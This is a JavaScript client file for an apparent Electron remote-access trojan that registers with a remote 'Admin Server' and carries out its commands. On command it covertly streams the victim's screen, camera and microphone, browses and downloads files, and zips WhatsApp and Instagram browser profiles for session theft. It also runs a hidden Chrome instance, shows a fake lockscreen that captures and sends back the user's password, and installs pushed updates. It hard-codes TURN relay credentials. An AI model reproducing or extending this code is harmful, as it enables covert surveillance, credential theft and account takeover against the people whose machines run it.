// =========================================================================
// VERY IMPORTANT:
// Change this to the IP Address of your main laptop (Anzee Laptop)
// Example: const SERVER_URL = "http://192.168.1.15:3000";
// =========================================================================
const SERVER_URL = "https://cml-1flz.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!

let socket;
let localScreenStream;
let localCameraStream;
let peerConnection;
const configuration = {
    iceServers: [
        { urls: 'stun:stun.relay.metered.ca:80' },
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun.cloudflare.com:3478' },
        { urls: 'stun:stun.twilio.com:3478' },
        { urls: 'stun:stun.miwifi.com:3478' },
        // User's Private TURN server
        { urls: 'turn:global.relay.metered.ca:80', username: 'd0cf6f20520b3c771abe4ffb', credential: '8vVbJfQu9HO3X/sn' },
        { urls: 'turn:global.relay.metered.ca:80?transport=tcp', username: 'd0cf6f20520b3c771abe4ffb', credential: '8vVbJfQu9HO3X/sn' },
        { urls: 'turn:global.relay.metered.ca:443', username: 'd0cf6f20520b3c771abe4ffb', credential: '8vVbJfQu9HO3X/sn' },
        { urls: 'turns:global.relay.metered.ca:443?transport=tcp', username: 'd0cf6f20520b3c771abe4ffb', credential: '8vVbJfQu9HO3X/sn' }
    ] 
};
let iceCandidatesQueue = [];
let screenInterval = null;

window.onload = async () => {
    // Dynamically load socket.io-client from the server
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';

    script.onload = async () => {
        socket = io(SERVER_URL);

        // Get the computer name (e.g., "Aqu-Laptop")
        const hostname = await window.electronAPI.getHostname();
        const appInfo = await window.electronAPI.getVersion();
        const appVersion = typeof appInfo === 'string' ? appInfo : appInfo.appVersion;
        const aptVersion = typeof appInfo === 'string' ? 'apt-1' : appInfo.aptVersion;

        socket.on('connect', () => {
            console.log("Connected to Admin Server");
            // Register this laptop to the Admin Dashboard (All-in-one app)
            socket.emit('register-client', { name: hostname, type: 'all', version: appVersion, apt: aptVersion });
        });

        socket.on('request-screen', async (adminId) => {
            console.log("Admin requested SCREEN");
            try {
                if (localScreenStream) {
                    localScreenStream.getTracks().forEach(track => track.stop());
                    localScreenStream = null;
                }
                const sources = await window.electronAPI.getSources();
                const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
                
                try {
                    localScreenStream = await navigator.mediaDevices.getUserMedia({
                        audio: { mandatory: { chromeMediaSource: 'desktop' } },
                        video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
                    });
                } catch (audioErr) {
                    console.log("Desktop audio capture failed (no speakers?). Trying video only...", audioErr);
                    try {
                        localScreenStream = await navigator.mediaDevices.getUserMedia({
                            audio: false,
                            video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
                        });
                    } catch (videoErr) {
                        console.log("Specific screen capture failed. Falling back to generic desktop capture...", videoErr);
                        localScreenStream = await navigator.mediaDevices.getUserMedia({
                            audio: false,
                            video: { mandatory: { chromeMediaSource: 'desktop' } }
                        });
                    }
                }

                setupWebRTC(adminId, localScreenStream);
            } catch (e) {
                console.error("Screen Capture failed completely:", e);
                socket.emit('client-error', "Screen Capture failed: " + e.message);
            }
        });

        socket.on('request-screen-mic', async (adminId) => {
            console.log("Admin requested SCREEN + MIC");
            try {
                if (localScreenStream) {
                    localScreenStream.getTracks().forEach(track => track.stop());
                    localScreenStream = null;
                }
                const sources = await window.electronAPI.getSources();
                const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
                
                let screenStream;
                try {
                    screenStream = await navigator.mediaDevices.getUserMedia({
                        audio: { mandatory: { chromeMediaSource: 'desktop' } },
                        video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
                    });
                } catch (audioErr) {
                    console.log("Desktop audio capture failed, using video only", audioErr);
                    try {
                        screenStream = await navigator.mediaDevices.getUserMedia({
                            audio: false,
                            video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
                        });
                    } catch (videoErr) {
                        console.log("Specific screen capture failed. Falling back to generic desktop capture...", videoErr);
                        screenStream = await navigator.mediaDevices.getUserMedia({
                            audio: false,
                            video: { mandatory: { chromeMediaSource: 'desktop' } }
                        });
                    }
                }

                try {
                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                    
                    // Mix system audio and mic audio into a single track
                    const audioContext = new AudioContext();
                    const dest = audioContext.createMediaStreamDestination();

                    let hasAudio = false;

                    if (screenStream.getAudioTracks().length > 0) {
                        const desktopSource = audioContext.createMediaStreamSource(new MediaStream([screenStream.getAudioTracks()[0]]));
                        desktopSource.connect(dest);
                        hasAudio = true;
                    }

                    if (micStream.getAudioTracks().length > 0) {
                        const micSource = audioContext.createMediaStreamSource(micStream);
                        micSource.connect(dest);
                        hasAudio = true;
                    }

                    const videoTrack = screenStream.getVideoTracks()[0];
                    
                    if (hasAudio && dest.stream.getAudioTracks().length > 0) {
                        const mixedAudioTrack = dest.stream.getAudioTracks()[0];
                        localScreenStream = new MediaStream([videoTrack, mixedAudioTrack]);
                    } else {
                        localScreenStream = new MediaStream([videoTrack]);
                    }
                    
                } catch(micErr) {
                    console.log("Mic access failed, continuing with screen only");
                    localScreenStream = screenStream;
                }

                setupWebRTC(adminId, localScreenStream);
            } catch (e) {
                console.error("Screen + Mic Capture failed", e);
                socket.emit('client-error', "Screen + Mic Capture failed: " + e.message);
            }
        });

        socket.on('request-screen-safe', async (adminId) => {
            console.log("Admin requested SCREEN SAFE MODE");
            if (screenInterval) clearTimeout(screenInterval);
            
            const startSafeStream = async () => {
                try {
                    const base64Frame = await window.electronAPI.getScreenThumbnail();
                    if (base64Frame) {
                        socket.emit('screen-safe-frame', { adminId, frame: base64Frame });
                    }
                } catch(e) {
                    console.error("Safe mode frame err", e);
                }
                
                // 5 FPS loop (200ms)
                screenInterval = setTimeout(startSafeStream, 200);
            };
            startSafeStream();
        });

        socket.on('stop-screen-safe', () => {
            console.log("Stopping SCREEN SAFE MODE");
            if (screenInterval) {
                clearTimeout(screenInterval);
                screenInterval = null;
            }
        });

        // Handle stop screen
        socket.on('stop-screen', () => {
            console.log("Stopping SCREEN");
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(track => track.stop());
                localScreenStream = null;
            }
            if (peerConnection) peerConnection.close();
            peerConnection = null;
        });

        // Handle explicit Camera/Mic request
        socket.on('request-camera', async (adminId) => {
            console.log("Admin requested CAMERA");
            try {
                localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                setupWebRTC(adminId, localCameraStream);
            } catch (camErr) {
                console.log("No Camera/Mic found or access denied.");
                socket.emit('client-error', "Camera not found on target laptop.");
            }
        });

        socket.on('request-chrome-list', async (adminId) => {
            try {
                const sources = await window.electronAPI.getSources();
                const chromeSources = sources.filter(s => 
                    s.name.toLowerCase().includes('chrome') || 
                    s.name.toLowerCase().includes('brave') || 
                    s.name.toLowerCase().includes('edge')
                );
                socket.emit('chrome-list', { adminId, sources: chromeSources });
            } catch (e) {
                console.error("Failed to get chrome sources", e);
            }
        });

        socket.on('request-chrome-window', async (data) => {
            const { adminId, sourceId } = data;
            console.log("Admin requested specific Chrome window:", sourceId);
            try {
                localScreenStream = await navigator.mediaDevices.getUserMedia({
                    audio: false, 
                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: sourceId } }
                });
                setupWebRTC(adminId, localScreenStream);
            } catch (e) {
                console.error("Chrome Window Capture failed", e);
                socket.emit('client-error', "Chrome Window Capture failed: " + e.message);
            }
        });

        socket.on('request-whatsapp', async (adminId) => {
            console.log("Admin requested WhatsApp window");
            try {
                const sources = await window.electronAPI.getSources();
                const waSource = sources.find(s => s.name.toLowerCase().includes('whatsapp'));
                
                if (!waSource) {
                    socket.emit('whatsapp-error', { adminId, error: "WhatsApp window is not found. Ensure WhatsApp Desktop or WhatsApp Web is open and active." });
                    return;
                }

                localScreenStream = await navigator.mediaDevices.getUserMedia({
                    audio: false, 
                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: waSource.id } }
                });
                setupWebRTC(adminId, localScreenStream);
            } catch (e) {
                console.error("WhatsApp Window Capture failed", e);
                socket.emit('client-error', "WhatsApp Window Capture failed: " + e.message);
            }
        });

        // Handle explicit Mic-only request
        socket.on('request-mic', async (adminId) => {
            console.log("Admin requested MIC ONLY");
            try {
                localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                setupWebRTC(adminId, localCameraStream);
            } catch (camErr) {
                console.log("No Mic found or access denied.");
                socket.emit('client-error', "Mic not found on target laptop.");
            }
        });

        let currentAdminForFiles = null;

        window.electronAPI.onDirProgress((percent) => {
            if (currentAdminForFiles) {
                socket.emit('file-list-progress', { targetId: currentAdminForFiles, percent: percent });
            }
        });

        // Handle File Browser Request
        socket.on('request-files', async (data) => {
            currentAdminForFiles = data.from;
            const targetPath = data.path;
            if (!targetPath) {
                const drives = await window.electronAPI.getDrives();
                const driveItems = drives.map(d => ({ name: d, path: d, isDirectory: true, size: 0 }));
                socket.emit('file-list', { targetId: data.from, path: '', files: driveItems });
            } else {
                const result = await window.electronAPI.readDirectory(targetPath);
                if (result.error) {
                    socket.emit('file-list', { targetId: data.from, path: targetPath, error: result.error });
                } else {
                    socket.emit('file-list', { targetId: data.from, path: targetPath, files: result });
                }
            }
        });

        // Handle Open File Execution
        socket.on('open-file', async (filePath) => {
            await window.electronAPI.openFile(filePath);
        });

        // Handle File Download (Chunked)
        socket.on('download-file', async (data) => {
            const { path: filePath, adminId } = data;
            const size = await window.electronAPI.getFileSize(filePath);
            if (size === -1) {
                socket.emit('download-error', { adminId, error: 'File not found or permission denied' });
                return;
            }
            socket.emit('download-start', { adminId, name: filePath.split('\\').pop(), size, path: filePath });
        });

        socket.on('request-chunk', async (data) => {
            const { path: filePath, start, end, adminId } = data;
            const base64Data = await window.electronAPI.readFileChunk(filePath, start, end);
            socket.emit('download-chunk', { adminId, start, data: base64Data });
        });

        // Handle Receiving Updates from Admin
        socket.on('push-update-start', async (data) => {
            console.log("Receiving update from admin...");
            await window.electronAPI.startUpdate();
        });

        socket.on('push-update-chunk', async (data) => {
            await window.electronAPI.writeUpdateChunk(data.chunk);
        });

        socket.on('push-update-end', async () => {
            console.log("Update received, installing...");
            await window.electronAPI.finishUpdateAndInstall();
        });

        // Handle Remote Control Actions
        socket.on('remote-action', async (action) => {
            await window.electronAPI.remoteAction(action);
        });

        // Handle Hidden Chrome requests
        socket.on('request-chrome-profiles', async (adminId) => {
            try {
                const profiles = await window.electronAPI.getChromeProfiles();
                socket.emit('chrome-profiles-list', { adminId, profiles });
            } catch (e) {
                console.error("Failed to get chrome profiles", e);
            }
        });

        socket.on('request-zip-whatsapp', async (data) => {
            const adminId = data.adminId || data;
            const profileName = data.profileName;
            try {
                const zipPath = await window.electronAPI.zipWhatsappProfile(profileName);
                if (zipPath) {
                    socket.emit('whatsapp-zip-ready', { adminId, targetId: socket.id, path: zipPath });
                } else {
                    socket.emit('whatsapp-zip-error', { adminId, error: "Profile could not be zipped or found." });
                }
            } catch (e) {
                socket.emit('whatsapp-zip-error', { adminId, error: e.message });
            }
        });

        socket.on('request-zip-instagram', async (data) => {
            const adminId = data.adminId || data;
            const profileName = data.profileName;
            try {
                const zipPath = await window.electronAPI.zipInstagramProfile(profileName);
                if (zipPath) {
                    socket.emit('instagram-zip-ready', { adminId, targetId: socket.id, path: zipPath });
                } else {
                    socket.emit('instagram-zip-error', { adminId, error: "Profile could not be zipped or found." });
                }
            } catch (e) {
                socket.emit('instagram-zip-error', { adminId, error: e.message });
            }
        });

        let currentAdminForHiddenChrome = null;
        socket.on('request-hidden-chrome', async (data) => {
            const adminId = data.adminId || data;
            const profileName = data.profileName;
            console.log("Admin requested Hidden Chrome", profileName || 'auto');
            currentAdminForHiddenChrome = adminId;
            const success = await window.electronAPI.startHiddenChrome(profileName);
            if (!success) {
                socket.emit('client-error', "Failed to start hidden Chrome. Chrome might not be installed.");
            }
        });

        window.electronAPI.onHiddenChromeFrame((frameData) => {
            if (currentAdminForHiddenChrome) {
                socket.emit('hidden-chrome-frame', { adminId: currentAdminForHiddenChrome, frame: frameData });
            }
        });

        socket.on('hidden-chrome-action', async (action) => {
            await window.electronAPI.sendHiddenChromeAction(action);
        });

        socket.on('stop-hidden-chrome', async () => {
            currentAdminForHiddenChrome = null;
            await window.electronAPI.stopHiddenChrome();
        });

        socket.on('force-stop-all', () => {
            console.log("Force Stop All received");
            if (localCameraStream) {
                localCameraStream.getTracks().forEach(track => track.stop());
                localCameraStream = null;
            }
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(track => track.stop());
                localScreenStream = null;
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            if (screenInterval) {
                clearTimeout(screenInterval);
                screenInterval = null;
            }
            window.electronAPI.stopHiddenChrome();
            currentAdminForHiddenChrome = null;
        });

        let currentAdminForLockscreen = null;
        socket.on('request-fake-lockscreen', (adminId) => {
            currentAdminForLockscreen = adminId;
            window.electronAPI.showFakeLockscreen();
        });

        window.electronAPI.onCapturedPassword((pwd) => {
            if (currentAdminForLockscreen) {
                socket.emit('captured-password', { targetId: currentAdminForLockscreen, password: pwd });
                currentAdminForLockscreen = null;
            }
        });

        // Helper function to setup WebRTC
        async function setupWebRTC(adminId, stream) {
            if (peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(configuration);
            iceCandidatesQueue = [];

            peerConnection.onicecandidate = e => {
                if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
            };

            stream.getTracks().forEach(track => {
                peerConnection.addTrack(track, stream);
            });

            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            socket.emit('offer', { offer: offer, targetId: adminId });
        }

        socket.on('answer', async (data) => {
            if (!peerConnection) return;
            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
            for (let candidate of iceCandidatesQueue) {
                try { await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)); } catch (err) { }
            }
            iceCandidatesQueue = [];
        });

        socket.on('ice-candidate', async (data) => {
            if (peerConnection) {
                if (peerConnection.remoteDescription) {
                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) { }
                } else {
                    iceCandidatesQueue.push(data.candidate);
                }
            }
        });

        socket.on('stop-screen', () => {
            console.log("Stopping screen share");
            if (screenInterval) clearInterval(screenInterval);
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(t => t.stop());
                localScreenStream = null;
            }
        });

        socket.on('stop-camera', stopWebRTCStream);
        socket.on('stop-mic', stopWebRTCStream);

        function stopWebRTCStream() {
            console.log("Stopping WebRTC Stream (Camera/Mic)");
            if (localCameraStream) {
                localCameraStream.getTracks().forEach(t => t.stop());
                localCameraStream = null;
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
        }

        socket.on('stop-watch', () => {
            console.log("Stopping all");
            if (screenInterval) clearInterval(screenInterval);
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(t => t.stop());
                localScreenStream = null;
            }
            if (localCameraStream) {
                localCameraStream.getTracks().forEach(t => t.stop());
                localCameraStream = null;
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            window.electronAPI.stopHiddenChrome();
            currentAdminForHiddenChrome = null;
        });
    };

    // If server is not running right now, retry every 5 seconds silently
    script.onerror = () => {
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    };

    document.head.appendChild(script);
};
